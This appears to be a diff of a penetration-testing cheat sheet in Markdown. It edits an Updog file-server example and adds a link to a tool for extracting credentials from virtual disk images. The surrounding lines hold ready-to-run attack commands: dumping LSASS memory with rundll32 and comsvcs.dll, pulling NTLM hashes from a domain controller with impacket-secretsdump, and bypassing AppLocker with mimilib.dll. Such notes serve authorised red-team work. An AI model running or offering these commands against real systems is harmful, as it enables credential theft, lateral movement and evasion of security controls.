@@ -455,7 +455,7 @@ PHP:
 - `smbget -R smb://1.1.1.1/folder` 
 - LOLBins Windows: https://lolbas-project.github.io/
 - LOLBins Linux: https://gtfobins.github.io/
-- Updog (https://github.com/sc0tfree/updog) --> `updog -d /tmp/www/ -p 443 --password Sugus --ssl`   
+- Updog (https://github.com/sc0tfree/updog) --> `updog -d /tmp/www/ -p 443 --password SuperS3cr3t --ssl`   
 
 ## PrivEsc Windows
 - https://github.com/itm4n/PrivescCheck   
@@ -621,7 +621,8 @@ If you have path traversal plus a location with write access you can exploit tha
   `Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of lsass.exe] c:\temp\candies.bin full`   
 - Extract specific users creds from DC:   
   `impacket-secretsdump 'domain.local/username:password'@<DC-IP> -just-dc-user <username> -just-dc-ntlm`   
-    
+- Extract creds from vmdk/vhd/vhdx files: https://github.com/CCob/Volumiser   
+
 ## Bypass Applocker
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
   `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
